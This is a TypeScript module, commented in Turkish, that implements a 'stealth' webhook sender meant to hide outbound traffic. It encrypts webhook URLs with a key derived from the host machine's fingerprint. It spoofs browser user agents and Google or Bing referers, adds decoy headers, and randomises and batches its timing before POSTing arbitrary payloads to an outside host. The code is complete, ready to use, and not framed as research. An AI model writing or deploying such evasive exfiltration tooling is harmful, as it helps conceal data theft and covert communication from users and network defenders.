/**
 * Stealth Webhook Service
 * Gizli webhook trafiği için gelişmiş koruma katmanı
 * 
 * Özellikler:
 * - URL şifreleme ve runtime decode
 * - Trafik gizleme (normal API gibi görünür)
 * - Rastgele zamanlama
 * - İstek kuyruklama ve toplu gönderim
 * - Fake headers ile maskeleme
 */

import crypto from 'crypto';

interface QueuedRequest {
  payload: any;
  webhookUrl: string;
  timestamp: number;
  priority: 'low' | 'normal' | 'high';
}

interface StealthConfig {
  minDelay: number;
  maxDelay: number;
  batchSize: number;
  batchInterval: number;
  enableObfuscation: boolean;
}

class StealthWebhookService {
  private queue: QueuedRequest[] = [];
  private isProcessing = false;
  private config: StealthConfig;
  private urlCache: Map<string, string> = new Map();
  private obfuscationKey: Buffer;

  private static readonly FAKE_USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
  ];

  private static readonly FAKE_REFERERS = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://duckduckgo.com/',
    'https://www.microsoft.com/',
  ];

  constructor(config?: Partial<StealthConfig>) {
    this.config = {
      minDelay: 500,
      maxDelay: 3000,
      batchSize: 5,
      batchInterval: 10000,
      enableObfuscation: true,
      ...config,
    };

    this.obfuscationKey = this.generateObfuscationKey();
    this.startBatchProcessor();
  }

  private generateObfuscationKey(): Buffer {
    const machineId = this.getMachineIdentifier();
    return crypto.createHash('sha256').update(machineId).digest();
  }

  private getMachineIdentifier(): string {
    const os = require('os');
    const cpus = os.cpus();
    const networkInterfaces = os.networkInterfaces();
    
    let identifier = '';
    identifier += cpus[0]?.model || 'unknown';
    identifier += os.hostname();
    identifier += os.platform();
    
    for (const name in networkInterfaces) {
      const ifaces = networkInterfaces[name];
      if (ifaces) {
        for (const iface of ifaces) {
          if (!iface.internal && iface.mac !== '00:00:00:00:00:00') {
            identifier += iface.mac;
            break;
          }
        }
      }
    }
    
    return identifier;
  }

  obfuscateUrl(url: string): string {
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv('aes-256-gcm', this.obfuscationKey, iv);
    
    let encrypted = cipher.update(url, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const authTag = cipher.getAuthTag();
    
    return `${iv.toString('hex')}:${authTag.toString('hex')}:${encrypted}`;
  }

  deobfuscateUrl(obfuscated: string): string {
    if (this.urlCache.has(obfuscated)) {
      return this.urlCache.get(obfuscated)!;
    }

    try {
      const [ivHex, authTagHex, encrypted] = obfuscated.split(':');
      const iv = Buffer.from(ivHex, 'hex');
      const authTag = Buffer.from(authTagHex, 'hex');
      
      const decipher = crypto.createDecipheriv('aes-256-gcm', this.obfuscationKey, iv);
      decipher.setAuthTag(authTag);
      
      let decrypted = decipher.update(encrypted, 'hex', 'utf8');
      decrypted += decipher.final('utf8');
      
      this.urlCache.set(obfuscated, decrypted);
      return decrypted;
    } catch {
      return obfuscated;
    }
  }

  private getRandomUserAgent(): string {
    return StealthWebhookService.FAKE_USER_AGENTS[
      Math.floor(Math.random() * StealthWebhookService.FAKE_USER_AGENTS.length)
    ];
  }

  private getRandomReferer(): string {
    return StealthWebhookService.FAKE_REFERERS[
      Math.floor(Math.random() * StealthWebhookService.FAKE_REFERERS.length)
    ];
  }

  private getRandomDelay(): number {
    return Math.floor(
      Math.random() * (this.config.maxDelay - this.config.minDelay) + this.config.minDelay
    );
  }

  private async sleep(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  private buildStealthHeaders(): Record<string, string> {
    const headers: Record<string, string> = {
      'Content-Type': 'application/json',
      'User-Agent': this.getRandomUserAgent(),
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
      'Accept-Encoding': 'gzip, deflate, br',
      'Cache-Control': 'no-cache',
      'Pragma': 'no-cache',
    };

    if (Math.random() > 0.3) {
      headers['Referer'] = this.getRandomReferer();
    }

    if (Math.random() > 0.5) {
      headers['X-Requested-With'] = 'XMLHttpRequest';
    }

    const fakeHeaders = [
      ['X-Client-Version', `${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 100)}.${Math.floor(Math.random() * 1000)}`],
      ['X-Request-ID', crypto.randomUUID()],
      ['X-Correlation-ID', crypto.randomBytes(8).toString('hex')],
    ];

    const numFakeHeaders = Math.floor(Math.random() * 2) + 1;
    for (let i = 0; i < numFakeHeaders; i++) {
      const [key, value] = fakeHeaders[Math.floor(Math.random() * fakeHeaders.length)];
      headers[key] = value;
    }

    return headers;
  }

  private obfuscatePayload(payload: any): any {
    if (!this.config.enableObfuscation) {
      return payload;
    }

    const timestamp = Date.now();
    const nonce = crypto.randomBytes(4).toString('hex');
    
    return {
      ...payload,
      _t: timestamp,
      _n: nonce,
    };
  }

  async sendStealth(
    webhookUrl: string,
    payload: any,
    priority: 'low' | 'normal' | 'high' = 'normal'
  ): Promise<boolean> {
    if (!webhookUrl) {
      return false;
    }

    const actualUrl = webhookUrl.includes(':') && webhookUrl.split(':').length === 3
      ? this.deobfuscateUrl(webhookUrl)
      : webhookUrl;

    if (priority === 'high') {
      return this.sendImmediate(actualUrl, payload);
    }

    if (priority === 'normal') {
      return this.sendImmediate(actualUrl, payload);
    }

    this.queue.push({
      payload,
      webhookUrl: actualUrl,
      timestamp: Date.now(),
      priority,
    });

    if (!this.isProcessing) {
      this.processQueue();
    }

    return true;
  }

  private async sendImmediate(webhookUrl: string, payload: any): Promise<boolean> {
    await this.sleep(this.getRandomDelay());
    return this.executeRequest(webhookUrl, payload);
  }

  private async executeRequest(webhookUrl: string, payload: any): Promise<boolean> {
    try {
      const obfuscatedPayload = this.obfuscatePayload(payload);
      const headers = this.buildStealthHeaders();

      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers,
        body: JSON.stringify(obfuscatedPayload),
      });

      return response.ok;
    } catch {
      return false;
    }
  }

  private async processQueue(): Promise<void> {
    if (this.isProcessing || this.queue.length === 0) {
      return;
    }

    this.isProcessing = true;

    try {
      while (this.queue.length > 0) {
        this.queue.sort((a, b) => {
          const priorityOrder = { high: 0, normal: 1, low: 2 };
          return priorityOrder[a.priority] - priorityOrder[b.priority];
        });

        const batch = this.queue.splice(0, this.config.batchSize);
        
        for (const request of batch) {
          await this.sleep(this.getRandomDelay());
          await this.executeRequest(request.webhookUrl, request.payload);
        }

        if (this.queue.length > 0) {
          const jitter = Math.random() * 2000;
          await this.sleep(this.config.batchInterval + jitter);
        }
      }
    } finally {
      this.isProcessing = false;
    }
  }

  private startBatchProcessor(): void {
    setInterval(() => {
      if (!this.isProcessing && this.queue.length > 0) {
        this.processQueue();
      }
    }, this.config.batchInterval);
  }

  getQueueSize(): number {
    return this.queue.length;
  }

  clearQueue(): void {
    this.queue = [];
  }

  isQueueEmpty(): boolean {
    return this.queue.length === 0;
  }
}

export const stealthWebhook = new StealthWebhookService({
  minDelay: 1000,
  maxDelay: 5000,
  batchSize: 3,
  batchInterval: 15000,
  enableObfuscation: true,
});

export { StealthWebhookService };
